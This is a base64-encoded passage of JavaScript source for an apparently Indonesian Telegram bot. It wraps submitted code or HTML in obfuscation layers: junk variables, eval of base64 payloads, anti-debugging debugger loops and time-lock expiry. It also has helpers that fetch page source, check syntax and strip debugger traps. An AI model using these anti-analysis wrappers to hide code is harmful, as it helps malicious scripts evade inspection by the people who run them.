i6JaU6JaHIiwi5rex5aScIiwi5q27Iiwi5aSiIgpdCgpjb25zdCBiNjQgPQpCdWZmZXIKLmZyb20oY29kZSkKLnRvU3RyaW5nKCJiYXNlNjQiKQoKcmV0dXJuIGAKKGZ1bmN0aW9uKCl7CiR7Y2hhb3NWYXJzKDgwMCxuYW1lcyl9CnNldEludGVydmFsKCgpPT57CmRlYnVnZ2VyCn0sNSkKY29uc29sZS5jbGVhcigpCmZ1bmN0aW9uICR7cmFuZG9tTmFtZShuYW1lcyl9KCl7CmNvbnN0ICR7cmFuZG9tTmFtZShuYW1lcyl9PSIke2I2NH0iCnJldHVybiBCdWZmZXIKLmZyb20oCiR7cmFuZG9tTmFtZShuYW1lcyl9LAoiYmFzZTY0IgopCi50b1N0cmluZygpCn0KZXZhbCgKJHtyYW5kb21OYW1lKG5hbWVzKX0oKQopCn0pKCk7CmAKCn0KCi8vID09PT09PT09PT09PT09PT09PT09IElOVklTSUJMRSA9PT09PT09PT09PT09PT09PT09PQoKZnVuY3Rpb24gaW52aXNTdHlsZShjb2RlKXsKCmNvbnN0IG5hbWVzID0gWwoi6YCP5piOIiwi5raI5aSxIiwi56m6Iiwi54ShIgpdCgpjb25zdCB1bmkgPQplc2NhcGUoCkJ1ZmZlcgouZnJvbShjb2RlKQoudG9TdHJpbmcoImJhc2U2NCIpCikKCnJldHVybiBgCihmdW5jdGlvbigpewoke2NoYW9zVmFycyg1MDAsbmFtZXMpfQpmdW5jdGlvbiAke3JhbmRvbU5hbWUobmFtZXMpfSgpewpyZXR1cm4gQnVmZmVyCi5mcm9tKAp1bmVzY2FwZSgiJHt1bml9IiksCiJiYXNlNjQiCikKLnRvU3RyaW5nKCkKfQpldmFsKAoke3JhbmRvbU5hbWUobmFtZXMpfSgpCikKfSkoKTsKYAoKfQoKLy8gPT09PT09PT09PT09PT09PT09PT0gSkFQQU4gPT09PT09PT09PT09PT09PT09PT0KCmZ1bmN0aW9uIGphcGFuU3R5bGUoY29kZSl7Cgpjb25zdCBqcCA9IFsKIuOBpOOBjSIsCiLjgZXjgY/jgokiLAoi44G744GXIiwKIuOBreOBkyIsCiLjgZ3jgokiLAoi44KG44GNIiwKIuOBv+OBmiIsCiLjgYvjgZwiLAoi44KM44GEIiwKIuOChOOBvyIsCiLjgoDjgZLjgpMiLAoi44Gv44GqIgpdCgpjb25zdCBiNjQgPQpCdWZmZXIKLmZyb20oY29kZSkKLnRvU3RyaW5nKCJiYXNlNjQiKQoKcmV0dXJuIGAKKGZ1bmN0aW9uKCl7JHtjaGFvc1ZhcnMoMTUwMCxqcCl9CmZ1bmN0aW9uICR7cmFuZG9tTmFtZShqcCl9KCl7CiR7Y2hhb3NWYXJzKDMwMCxqcCl9CmNvbnN0ICR7cmFuZG9tTmFtZShqcCl9PSIke2I2NH0iCnJldHVybiBCdWZmZXIKLmZyb20oCiR7cmFuZG9tTmFtZShqcCl9LAoiYmFzZTY0IgopCi50b1N0cmluZygpCn0KZXZhbCgKJHtyYW5kb21OYW1lKGpwKX0oKQopCn0pKCk7CmAKCn0KCi8vID09PT09PT09PT09PT09PT09PT09IEFSQUIgPT09PT09PT09PT09PT09PT09PT0KCmZ1bmN0aW9uIGFyYWJTdHlsZShjb2RlKXsKCmNvbnN0IGFyID0gWwoi2LPZhNin2YUiLAoi2YLZhdixIiwKItmG2YjYsSIsCiLZhNmK2YQiLAoi2LTZhdizIiwKItmG2KfYsSIsCiLYsdmI2K0iLAoi2YXZiNiqIgpdCgpjb25zdCBiNjQgPQpCdWZmZXIKLmZyb20oY29kZSkKLnRvU3RyaW5nKCJiYXNlNjQiKQoKcmV0dXJuIGAKKGZ1bmN0aW9uKCl7JHtjaGFvc1ZhcnMoOTAwLGFyKX0KZnVuY3Rpb24gJHtyYW5kb21OYW1lKGFyKX0oKXsKY29uc3QgJHtyYW5kb21OYW1lKGFyKX09IiR7YjY0fSIKcmV0dXJuIEJ1ZmZlcgouZnJvbSgKJHtyYW5kb21OYW1lKGFyKX0sCiJiYXNlNjQiCikKLnRvU3RyaW5nKCkKCn0KZXZhbCgKJHtyYW5kb21OYW1lKGFyKX0oKQopCn0pKCk7CmAKCn0KCi8vID09PT09PT09PT09PT09PT09PT09IFNJVSA9PT09PT09PT09PT09PT09PT09PQoKZnVuY3Rpb24gc2l1U3R5bGUoY29kZSl7Cgpjb25zdCBzaXUgPSBbCiJTSVVVIiwiUk9OQUxETyIsIkdPQUwiLCJDUjciCl0KCmNvbnN0IGI2NCA9CkJ1ZmZlcgouZnJvbShjb2RlKQoudG9TdHJpbmcoImJhc2U2NCIpCgpyZXR1cm4gYAooZnVuY3Rpb24oKXske2NoYW9zVmFycyg2MDAsc2l1KX0KZnVuY3Rpb24gJHtyYW5kb21OYW1lKHNpdSl9KCl7CmNvbnN0ICR7cmFuZG9tTmFtZShzaXUpfT0iJHtiNjR9IgpyZXR1cm4gQnVmZmVyCi5mcm9tKAoke3JhbmRvbU5hbWUoc2l1KX0sCiJiYXNlNjQiCikKLnRvU3RyaW5nKCkKCn0KZXZhbCgKJHtyYW5kb21OYW1lKHNpdSl9KCkKKQp9KSgpOwpgCgp9CgovLyA9PT09PT09PT09PT09PT09PT09PSBORUJVTEEgPT09PT09PT09PT09PT09PT09PT0KCmZ1bmN0aW9uIG5lYnVsYVN0eWxlKGNvZGUpewoKY29uc3QgbmViID0gWwoi5pif6ZuyIiwi5a6H5a6ZIiwi6YqA5rKzIiwi6ZeHIiwKIuODluODqeODg+OCryIsIueEoemZkCIsIuOCvOODrSIKXQoKY29uc3QgYjY0ID0KQnVmZmVyCi5mcm9tKGNvZGUpCi50b1N0cmluZygiYmFzZTY0IikKCnJldHVybiBgCihmdW5jdGlvbigpeyR7Y2hhb3NWYXJzKDI1MDAsbmViKX0Kc2V0SW50ZXJ2YWwoKCk9PnsKZGVidWdnZXIKfSwxKQpjb25zb2xlLmNsZWFyKCkKZnVuY3Rpb24gJHtyYW5kb21OYW1lKG5lYil9KCl7CiR7Y2hhb3NWYXJzKDUwMCxuZWIpfQpjb25zdCAke3JhbmRvbU5hbWUobmViKX09IiR7YjY0fSIKcmV0dXJuIEJ1ZmZlcgouZnJvbSgKJHtyYW5kb21OYW1lKG5lYil9LAoiYmFzZTY0IgopCi50b1N0cmluZygpCn0KZXZhbCgKJHtyYW5kb21OYW1lKG5lYil9KCkKKQp9KSgpOwpgCgp9CgovLyA9PT09PT09PT09PT09PT09PT09PSBWQVIgPT09PT09PT09PT09PT09PT09PT0KCmZ1bmN0aW9uIHZhclN0eWxlKGNvZGUpewoKY29uc3QgbmFtZXMgPSBbCiLlpInmlbAiLCLkubHmlbAiLCLnhKHpmZAiLCLlvbEiLAoi5bm7Iiwi6ZeHIiwi6Zu2IgpdCgpyZXR1cm4gYAooZnVuY3Rpb24oKXske2NoYW9zVmFycygzMDAwLG5hbWVzKX0KJHtjb2RlfQp9KSgpOwpgCgp9CgovLyA9PT09PT09PT09PT09PT09PT09PSBDVVNUT00gPT09PT09PT09PT09PT09PT09PT0KCmZ1bmN0aW9uIGN1c3RvbVN0eWxlKGNvZGUsIHRleHRDdXN0b20pIHsKCmNvbnN0IG5hbWVzID0gWwoi5pS56YCgIiwi5qW16ZmQIiwi5re35LmxIiwi56C05aOKIiwKIuWcsOeNhCIsIuaal+m7kiIsIuiZmueEoSIKXQoKY29uc3QgYjY0ID0gQnVmZmVyCi5mcm9tKGNvZGUpCi50b1N0cmluZygiYmFzZTY0IikKCmNvbnN0IGZ1bmNOYW1lID0gcmFuZG9tTmFtZShuYW1lcykKY29uc3QgdmFyTmFtZSA9IHJhbmRvbU5hbWUobmFtZXMpCgpyZXR1cm4gYChmdW5jdGlvbigpewoke2NoYW9zVmFycygxMjAwLG5hbWVzKX0KZnVuY3Rpb24gJHt0ZXh0Q3VzdG9tfSgpewpjb25zdCAke3Zhck5hbWV9PSIke2I2NH0iCnJldHVybiBCdWZmZXIKLmZyb20oCiR7dmFyTmFtZX0sCiJiYXNlNjQiCikKLnRvU3RyaW5nKCkKfQpldmFsKAoke2Z1bmNOYW1lfSgpCikKfSkoKTsKYAoKfQoKLy8gPT09PT09PT09PT09PT09PT09PT0gRVhQSVJFRCA9PT09PT09PT09PT09PT09PT09PQoKZnVuY3Rpb24gdGltZUxvY2tTdHlsZShjb2RlLGRheXMpewoKY29uc3QgbmFtZXMgPSBbCiLmnJ/pmZAiLCLntYLnhIkiLCLmmYLplpMiLCLlsIHljbAiCl0KCmNvbnN0IGV4cGlyZWQgPQpEYXRlLm5vdygpICsKKE51bWJlcihkYXlzKSAqIDg2NDAwMDAwKQoKY29uc3QgYjY0ID0KQnVmZmVyCi5mcm9tKGNvZGUpCi50b1N0cmluZygiYmFzZTY0IikKCnJldHVybiBgCihmdW5jdGlvbigpeyR7Y2hhb3NWYXJzKDcwMCxuYW1lcyl9CmNvbnN0ICR7cmFuZG9tTmFtZShuYW1lcyl9PSIke2V4cGlyZWR9IgppZigKRGF0ZS5ub3coKSA+Ck51bWJlcigKJHtyYW5kb21OYW1lKG5hbWVzKX0KKQopewpjb25zb2xlLmxvZygKIlNjcmlwdCBFeHBpcmVkIgopCnByb2Nlc3MuZXhpdCgpCn0KZnVuY3Rpb24gJHtyYW5kb21OYW1lKG5hbWVzKX0oKXsKY29uc3QgJHtyYW5kb21OYW1lKG5hbWVzKX09IiR7YjY0fSIKcmV0dXJuIEJ1ZmZlcgouZnJvbSgKJHtyYW5kb21OYW1lKG5hbWVzKX0sCiJiYXNlNjQiCikKLnRvU3RyaW5nKCkKfQpldmFsKAoke3JhbmRvbU5hbWUobmFtZXMpfSgpCikKfSkoKTsKYAoKfQoKLy8gQ09NTUFORAovLyAvYXJ0aWxsZXJ5CmJvdC5jb21tYW5kKAonYXJ0aWxsZXJ5JywKKGN0eCk9Pgpwcm9jZXNzT2JmdXNjYXRlKApjdHgsCmFydGlsbGVyeVN0eWxlLAonQXJ0aWxsZXJ5JwopCikKCi8vIC9oYXJkY29yZQpib3QuY29tbWFuZCgKJ2hhcmRjb3JlJywKKGN0eCk9Pgpwcm9jZXNzT2JmdXNjYXRlKApjdHgsCmhhcmRjb3JlU3R5bGUsCidIYXJkY29yZScKKQopCgovLyAvcGhhbnRvbQpib3QuY29tbWFuZCgKJ3BoYW50b20nLAooY3R4KT0+CnByb2Nlc3NPYmZ1c2NhdGUoCmN0eCwKcGhhbnRvbVN0eWxlLAonUGhhbnRvbScKKQopCgovLyAvYmFsYW5jZWQKYm90LmNvbW1hbmQoCidiYWxhbmNlZCcsCihjdHgpPT4KcHJvY2Vzc09iZnVzY2F0ZSgKY3R4LApiYWxhbmNlZFN0eWxlLAonQmFsYW5jZWQnCikKKQoKLy8gL3JldmVyc2VkCmJvdC5jb21tYW5kKAoncmV2ZXJzZWQnLAooY3R4KT0+CnByb2Nlc3NPYmZ1c2NhdGUoCmN0eCwKcmV2ZXJzZWRTdHlsZSwKJ1JldmVyc2VkJwopCikKCi8vIC9yb3NlbWFyeQpib3QuY29tbWFuZCgKJ3Jvc2VtYXJ5JywKKGN0eCk9Pgpwcm9jZXNzT2JmdXNjYXRlKApjdHgsCnJvc2VtYXJ5U3R5bGUsCidSb3NlbWFyeScKKQopCgovLyAvaW52aXNlbmMKYm90LmNvbW1hbmQoCidpbnZpc2VuYycsCihjdHgpPT4KcHJvY2Vzc09iZnVzY2F0ZSgKY3R4LAppbnZpc1N0eWxlLAonSW52aXNFbmMnCikKKQoKLy8gL2phcGFuZW5jCmJvdC5jb21tYW5kKAonamFwYW5lbmMnLAooY3R4KT0+CnByb2Nlc3NPYmZ1c2NhdGUoCmN0eCwKamFwYW5TdHlsZSwKJ2phcGFuZW5jJwopCikKCi8vIC9lbmNhcmFiCmJvdC5jb21tYW5kKAonZW5jYXJhYicsCihjdHgpPT4KcHJvY2Vzc09iZnVzY2F0ZSgKY3R4LAphcmFiU3R5bGUsCidlbmNhcmFiJwopCikKCi8vIC9zaXVlbmMKYm90LmNvbW1hbmQoCidzaXVlbmMnLAooY3R4KT0+CnByb2Nlc3NPYmZ1c2NhdGUoCmN0eCwKc2l1U3R5bGUsCidzaXVlbmMnCikKKQoKLy8gL2phcGFuCmJvdC5jb21tYW5kKAonamFwYW4nLAooY3R4KT0+CnByb2Nlc3NPYmZ1c2NhdGUoCmN0eCwKamFwYW5TdHlsZSwKJ0phcGFuJwopCikKCi8vIC9uZWJ1bGEKYm90LmNvbW1hbmQoCiduZWJ1bGEnLAooY3R4KT0+CnByb2Nlc3NPYmZ1c2NhdGUoCmN0eCwKbmVidWxhU3R5bGUsCidOZWJ1bGEnCikKKQoKLy8gL3Zhcgpib3QuY29tbWFuZCgKJ3ZhcicsCihjdHgpPT4KcHJvY2Vzc09iZnVzY2F0ZSgKY3R4LAp2YXJTdHlsZSwKJ1ZhcicKKQopCgovLyAvZW5jdGltZQpib3QuY29tbWFuZCgKJ2VuY3RpbWUnLAphc3luYyhjdHgpPT57Cgpjb25zdCBkYXlzID0KY3R4Lm1lc3NhZ2UudGV4dAouc3BsaXQoJyAnKVsxXQoKaWYoIWRheXMpewoKcmV0dXJuIGN0eC5yZXBseSgKJ+KdjCBFeGFtcGxlIDogL2VuY3RpbWUgMzAnCikKCn0KCmF3YWl0IHByb2Nlc3NPYmZ1c2NhdGUoCmN0eCwKKGNvZGUpPT50aW1lTG9ja1N0eWxlKGNvZGUsIGRheXMpLAonRW5jVGltZScKKQoKfQopCgovLyAvZW5jY3VzdG9tCmJvdC5jb21tYW5kKAonZW5jY3VzdG9tJywKYXN5bmMoY3R4KT0+ewoKY29uc3QgdGV4dCA9CmN0eC5tZXNzYWdlLnRleHQKLnNwbGl0KCcgJykKLnNsaWNlKDEpCi5qb2luKCcgJykKCmlmKCF0ZXh0KXsKCnJldHVybiBjdHgucmVwbHkoCifinYwgRXhhbXBsZSA6IC9lbmNjdXN0b20gU2FiaWxPZmZpY2lhbCcKKQoKfQoKYXdhaXQgcHJvY2Vzc09iZnVzY2F0ZSgKY3R4LAooY29kZSk9PmN1c3RvbVN0eWxlKGNvZGUsIHRleHQpLAonRW5jQ3VzdG9tJwopCgp9CikKCi8vID09PT09PT09PT09PT09PT09PT09IEhBUkRIVE1MID09PT09PT09PT09PT09PT09PT09Cgpib3QuY29tbWFuZCgiaGFyZGh0bWwiLCBhc3luYyAoY3R4KSA9PiB7Cgp0cnkgewoKaWYgKCFjdHgubWVzc2FnZS5yZXBseV90b19tZXNzYWdlPy5kb2N1bWVudCkgewpyZXR1cm4gY3R4LnJlcGx5KCJSZXBseSBmaWxlIGh0bWwuIik7Cn0KCmNvbnN0IGZpbGUgPQphd2FpdCBjdHgudGVsZWdyYW0uZ2V0RmlsZSgKY3R4Lm1lc3NhZ2UucmVwbHlfdG9fbWVzc2FnZS5kb2N1bWVudC5maWxlX2lkCikKCmNvbnN0IGxpbmsgPSBgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2ZpbGUvYm90JHtjb25maWcuQk9UX1RPS0VOfS8ke2ZpbGUuZmlsZV9wYXRofWAKCmNvbnN0IHJlcyA9CmF3YWl0IGF4aW9zLmdldChsaW5rKQoKY29uc3QgaHRtbCA9IHJlcy5kYXRhCgpjb25zdCBiNjQgPQpCdWZmZXIKLmZyb20oaHRtbCkKLnRvU3RyaW5nKCJiYXNlNjQiKQoKbGV0IGFudGkgPSAiIgoKZm9yKGxldCBpPTA7aTw4MDA7aSsrKXsKCmFudGkgKz0gYAp2YXIgXyR7cmFuZG9tSGV4KDgpfT0iJHtyYW5kb21IZXgoNTApfSI7CmAKCn0KCmNvbnN0IHJlc3VsdCA9IGAKPCEtLSBIQVJESFRNTCAtLT4KCjxzY3JpcHQ+Cgoke2FudGl9CgpzZXRJbnRlcnZhbCgoKT0+ewpkZWJ1Z2dlcgp9LDEpCgpldmFsKAphdG9iKAoiJHtiNjR9IgopCikKCjwvc2NyaXB0PgpgCgphd2FpdCBjdHgucmVwbHlXaXRoRG9jdW1lbnQoewpzb3VyY2U6IEJ1ZmZlci5mcm9tKHJlc3VsdCksCmZpbGVuYW1lOiAiaGFyZGh0bWwuaHRtbCIKfSkKCn0gY2F0Y2goZSl7CgpjdHgucmVwbHkoU3RyaW5nKGUpKQoKfQoKfSkKCi8vID09PT09PT09PT09PT09PT09PT09IElOVklTSFRNTCA9PT09PT09PT09PT09PT09PT09PQoKYm90LmNvbW1hbmQoImludmlzaHRtbCIsIGFzeW5jIChjdHgpID0+IHsKCnRyeSB7CgppZiAoIWN0eC5tZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2U/LmRvY3VtZW50KSB7CnJldHVybiBjdHgucmVwbHkoIlJlcGx5IGZpbGUgaHRtbC4iKTsKfQoKY29uc3QgZmlsZSA9CmF3YWl0IGN0eC50ZWxlZ3JhbS5nZXRGaWxlKApjdHgubWVzc2FnZS5yZXBseV90b19tZXNzYWdlLmRvY3VtZW50LmZpbGVfaWQKKQoKY29uc3QgbGluayA9IGBodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvZmlsZS9ib3Qke2NvbmZpZy5CT1RfVE9LRU59LyR7ZmlsZS5maWxlX3BhdGh9YAoKY29uc3QgcmVzID0KYXdhaXQgYXhpb3MuZ2V0KGxpbmspCgpjb25zdCBodG1sID0gcmVzLmRhdGEKCmNvbnN0IHVuaSA9CmVzY2FwZSgKQnVmZmVyCi5mcm9tKGh0bWwpCi50b1N0cmluZygiYmFzZTY0IikKKQoKY29uc3QgcmVzdWx0ID0gYAo8IS0tIElOVklTSUJMRSBIVE1MIC0tPgoKPHNjcmlwdD4KCmV2YWwoCmF0b2IoCnVuZXNjYXBlKAoiJHt1bml9IgopCikKKQoKPC9zY3JpcHQ+CmAKCmF3YWl0IGN0eC5yZXBseVdpdGhEb2N1bWVudCh7CnNvdXJjZTogQnVmZmVyLmZyb20ocmVzdWx0KSwKZmlsZW5hbWU6ICJpbnZpc2h0bWwuaHRtbCIKfSkKCn0gY2F0Y2goZSl7CgpjdHgucmVwbHkoU3RyaW5nKGUpKQoKfQoKfSkKCi8vID09PT09PT09PT09PT09PT09PT09IEdFVFNPVVJDRSA9PT09PT09PT09PT09PT09PT09PQoKYm90LmNvbW1hbmQoImdldHNvdXJjZSIsIGFzeW5jIChjdHgpID0+IHsKCnRyeSB7Cgpjb25zdCB1cmwgPQpjdHgubWVzc2FnZS50ZXh0Ci5zcGxpdCgiICIpCi5zbGljZSgxKQouam9pbigiICIpCgppZighdXJsKXsKcmV0dXJuIGN0eC5yZXBseSgKIkV4YW1wbGU6XG4vZ2V0c291cmNlIGh0dHBzOi8vZXhhbXBsZS5jb20iCikKfQoKY29uc3QgcmVzID0KYXdhaXQgYXhpb3MuZ2V0KHVybCkKCmNvbnN0IGh0bWwgPSByZXMuZGF0YQoKYXdhaXQgY3R4LnJlcGx5V2l0aERvY3VtZW50KHsKc291cmNlOiBCdWZmZXIuZnJvbShodG1sKSwKZmlsZW5hbWU6ICJzb3VyY2UuaHRtbCIKfSkKCn0gY2F0Y2goZSl7CgpjdHgucmVwbHkoU3RyaW5nKGUpKQoKfQoKfSkKCmJvdC5jb21tYW5kKCJjZWtjb2RlIiwgYXN5bmMgKGN0eCkgPT4gewp0cnkgewoKaWYgKCFjdHgubWVzc2FnZS5yZXBseV90b19tZXNzYWdlKQpyZXR1cm4gY3R4LnJlcGx5KCJSZXBseSBmdW5jdGlvbiBKYXZhU2NyaXB0IHlhbmcgaW5naW4gZGljZWsuIikKCmNvbnN0IHRleHQgPQpjdHgubWVzc2FnZS5yZXBseV90b19tZXNzYWdlLnRleHQgfHwKY3R4Lm1lc3NhZ2UucmVwbHlfdG9fbWVzc2FnZS5jYXB0aW9uCgppZiAoIXRleHQpCnJldHVybiBjdHgucmVwbHkoIlBlc2FuIHlhbmcgZGlyZXBseSB0aWRhayBiZXJpc2kga29kZS4iKQoKbGV0IGFjb3JuCnRyeSB7CmFjb3JuID0gcmVxdWlyZSgiYWNvcm4iKQp9IGNhdGNoIHsKcmV0dXJuIGN0eC5yZXBseSgiTW9kdWxlIGFjb3JuIGJlbHVtIHRlcmluc3RhbGwuXG5JbnN0YWxsIGRlbmdhbjogbnBtIGluc3RhbGwgYWNvcm4iKQp9Cgp0cnkgewoKYWNvcm4ucGFyc2UodGV4dCwgewplY21hVmVyc2lvbjogImxhdGVzdCIsCnNvdXJjZVR5cGU6ICJtb2R1bGUiLApsb2NhdGlvbnM6IHRydWUKfSkKCnJldHVybiBjdHgucmVwbHkoYPCflI4gTWVuZ2VjZWsgQ29kZS4uLi4uCgpBc2VrayBHYSBhZGEgRXJyb3IgQ3V5IERpIENvZGUgTnlhLmApCgp9IGNhdGNoIChlcnIpIHsKCmNvbnN0IGxpbmVzID0gdGV4dC5zcGxpdCgiXG4iKQpjb25zdCBsaW5lID0gZXJyLmxvYy5saW5lCmNvbnN0IGNvbHVtbiA9IGVyci5sb2MuY29sdW1uCgpjb25zdCBzdGFydCA9IE1hdGgubWF4KDAsIGxpbmUgLSAzKQpjb25zdCBlbmQgPSBNYXRoLm1pbihsaW5lcy5sZW5ndGgsIGxpbmUgKyAyKQoKY29uc3Qgc25pcHBldCA9IGxpbmVzLnNsaWNlKHN0YXJ0LCBlbmQpLm1hcCgobCwgaSkgPT4gewpjb25zdCBudW0gPSBzdGFydCArIGkgKyAxCnJldHVybiBudW0gPT09IGxpbmUKPyBg8J+RiSAke251bX0gfCAke2x9YAo6IGDCoMKgICR7bnVtfSB8ICR7bH1gCn0pLmpvaW4oIlxuIikKCnJldHVybiBjdHgucmVwbHkoYFlhaGhoIENvZGUgTnlhIEVycm9yIE5pIEZpeGVkIERvbmcKCiR7ZXJyLm1lc3NhZ2V9CkxpbmUgJHtsaW5lfToke2NvbHVtbn0KCvCfk4wgQ3VwbGlrYW46CiR7c25pcHBldH1gKQoKfQoKfSBjYXRjaCAoZSkgewpjb25zb2xlLmVycm9yKGUpCmN0eC5yZXBseSgiVGVyamFkaSBlcnJvciBzYWF0IG1lbmdlY2VrIGNvZGUuIikKfQoKfSk7CgovLyA9PT09PT09PT09PT09PT09PT09PSBJTkZPRVJST1IgPT09PT09PT09PT09PT09PT09PT0KCmJvdC5jb21tYW5kKCJpbmZvZXJyb3IiLCBhc3luYyAoY3R4KSA9PiB7Cgp0cnkgewoKaWYgKCFjdHgubWVzc2FnZS5yZXBseV90b19tZXNzYWdlPy5kb2N1bWVudCkgewpyZXR1cm4gY3R4LnJlcGx5KCJSZXBseSBmaWxlIGpzLiIpOwp9Cgpjb25zdCBmaWxlID0KYXdhaXQgY3R4LnRlbGVncmFtLmdldEZpbGUoCmN0eC5tZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2UuZG9jdW1lbnQuZmlsZV9pZAopCgpjb25zdCBsaW5rID0gYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9maWxlL2JvdCR7Y29uZmlnLkJPVF9UT0tFTn0vJHtmaWxlLmZpbGVfcGF0aH1gCgpjb25zdCByZXMgPQphd2FpdCBheGlvcy5nZXQobGluaykKCmxldCBjb2RlID0gcmVzLmRhdGEKCmxldCBpbmZvID0gW10KCmlmKGNvZGUuaW5jbHVkZXMoImV2YWwoZXZhbCgiKSl7CmluZm8ucHVzaCgiTmVzdGVkIGV2YWwgZGV0ZWN0ZWQiKQp9CgppZihjb2RlLmluY2x1ZGVzKCJkZWJ1Z2dlciIpKXsKaW5mby5wdXNoKCJEZWJ1Z2dlciBkZXRlY3RlZCIpCn0KCmlmKGNvZGUuaW5jbHVkZXMoIndoaWxlKHRydWUpIikpewppbmZvLnB1c2goIkluZmluaXRlIGxvb3AgZGV0ZWN0ZWQiKQp9CgppZihjb2RlLmxlbmd0aCA+IDUwMDAwMCl7CmluZm8ucHVzaCgiRmlsZSB0b28gbGFyZ2UiKQp9CgppZihpbmZvLmxlbmd0aCA8IDEpewppbmZvLnB1c2goIk5vIHByb2JsZW0gZGV0ZWN0ZWQiKQp9CgpjdHgucmVwbHkoCmBJTkZPIEVSUk9SOlxuXG4tICR7aW5mby5qb2luKCJcbi0gIil9YAopCgp9IGNhdGNoKGUpewoKY3R4LnJlcGx5KFN0cmluZyhlKSkKCn0KCn0pCgovLyA9PT09PT09PT09PT09PT09PT09PSBGSVhGVU5DID09PT09PT09PT09PT09PT09PT09Cgpib3QuY29tbWFuZCgiZml4ZnVuYyIsIGFzeW5jIChjdHgpID0+IHsKCnRyeSB7CgppZiAoIWN0eC5tZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2U/LmRvY3VtZW50KSB7CnJldHVybiBjdHgucmVwbHkoIlJlcGx5IGZpbGUganMuIik7Cn0KCmNvbnN0IGZpbGUgPQphd2FpdCBjdHgudGVsZWdyYW0uZ2V0RmlsZSgKY3R4Lm1lc3NhZ2UucmVwbHlfdG9fbWVzc2FnZS5kb2N1bWVudC5maWxlX2lkCikKCmNvbnN0IGxpbmsgPSBgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2ZpbGUvYm90JHtjb25maWcuQk9UX1RPS0VOfS8ke2ZpbGUuZmlsZV9wYXRofWAKCmNvbnN0IHJlcyA9CmF3YWl0IGF4aW9zLmdldChsaW5rKQoKbGV0IGNvZGUgPSByZXMuZGF0YQoKY29kZSA9IGNvZGUKLnJlcGxhY2UoL2RlYnVnZ2VyOy9nLCIiKQoucmVwbGFjZSgvd2hpbGVccypcKFxzKnRydWVccypcKS9nLCJ3aGlsZShmYWxzZSkiKQoucmVwbGFjZSgvZXZhbFwoZXZhbFwoL2csImV2YWwoIikKCmF3YWl0IGN0eC5yZXBseVdpdGhEb2N1bWVudCh7CnNvdXJjZTogQnVmZmVyLmZyb20oY29kZSksCmZpbGVuYW1lOiAiZml4ZWQuanMiCn0pCgp9IGNhdGNoKGUpewoKY3R4LnJlcGx5KFN0cmluZyhlKSkKCn0KCn0pCgovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQovLyBDTUQgQkFDS1VQCi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmJvdC5jb21tYW5kKCJiYWNrdXAiLCBhc3luYyAoY3R4KSA9PiB7CgogICAgICAgIGNvbnN0IHVzZXJJZCA9CiAgICAgICAgICAgIE51bWJlcihjdHguZnJvbS5pZCkKCiAgICAgICAgLy8gb3duZXIgb25seQogICAgICAgIGlmICh1c2VySWQgIT09IGNvbmZpZy5PV05FUl9JRCkgewoKICAgICAgICAgICAgcmV0dXJuIGN0eC5yZXBseSgKICAgICAgICAgICAgICAgICLinYwgT3duZXIgb25seS4iCiAgICAgICAgICAgICkKICAgICAgICB9CgogICAgICAgIGF3YWl0IGN0eC5yZXBseSgKICAgICAgICAgICAgIvCfk6YgTWVtYnVhdCBiYWNrdXAuLi4iCiAgICAgICAgKQoKICAgICAgICBhd2FpdCBzZW5kQmFja3VwKAogICAgICAgICAgICAiTWFudWFsIEJhY2t1cCIKICAgICAgICApCgogICAgICAgIGF3YWl0IGN0eC5yZXBseSgKICAgICAgICAgICAgIuKchSBCYWNrdXAgYmVyaGFzaWwgZGlraXJpbSBrZSBvd25lci4iCiAgICAgICAgKQp9KQoKLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KLy8gQ01EIENIQVRBRE1JTgovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpib3QuY29tbWFuZCgKICAgICJjaGF0b3duZXIiLAogICAgYXN5bmMgKGN0eCkgPT4gewoKICAgICAgICBjb25zdCB1c2VySWQgPQogICAgICAgICAgICBOdW1iZXIoY3R4LmZyb20uaWQpCgogICAgICAgIC8vIG93bmVyIHRpZGFrIGJpc2EKICAgICAgICBpZiAodXNlcklkID09PSBjb25maWcuT1dORVJfSUQpIHsKCiAgICAgICAgICAgIHJldHVybiBjdHgucmVwbHkoCiAgICAgICAgICAgICAgICAiQ29tbWFuZCBpbmkgaGFueWEgdW50dWsgdXNlci4iCiAgICAgICAgICAgICkKICAgICAgICB9CgogICAgICAgIC8vIGFrdGlma2FuIG1vZGUgY2hhdAogICAgICAgIEFETUlOX1JFUExZX0RCW3VzZXJJZF0gPSB7CiAgICAgICAgICAgIHdhaXRpbmcgOiB0cnVlCiAgICAgICAgfQoKICAgICAgICAvLyBidXR0b24gY2FuY2VsCiAgICAgICAgY29uc3Qga2IgPSB7CiAgICAgICAgICAgIGlubGluZV9rZXlib2FyZDogWwogICAgICAgICAgICAgICAgWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgdGV4dDogIuKdjCBCYXRhbGthbiIsCiAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrX2RhdGE6ICJjYW5jZWxfY2hhdF9hZG1pbiIsCiAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlOiAiZGFuZ2VyIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgXQogICAgICAgIH0KCiAgICAgICAgLy8ga2lyaW0ga2UgdXNlcgogICAgICAgIGF3YWl0IGN0eC5yZXBseSgKYAo8YmxvY2txdW90ZT48Yj7wn5KsIENIQVQgT1dORVI8L2I+PC9ibG9ja3F1b3RlPgo8YmxvY2txdW90ZT48Yj5TaWxhaGthbiBraXJpbSBwZXNhbiBhbmRhIHVudHVrIG93bmVyLjwvYj48L2Jsb2NrcXVvdGU+CjxibG9ja3F1b3RlPjxiPlBlc2FuIGFrYW4gbGFuZ3N1bmcgZGl0ZXJ1c2thbiBrZSBvd25lci48L2I+PC9ibG9ja3F1b3RlPgpgLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBwYXJzZV9tb2RlOiAiSFRNTCIsCiAgICAgICAgICAgICAgICByZXBseV9tYXJrdXA6IGtiCiA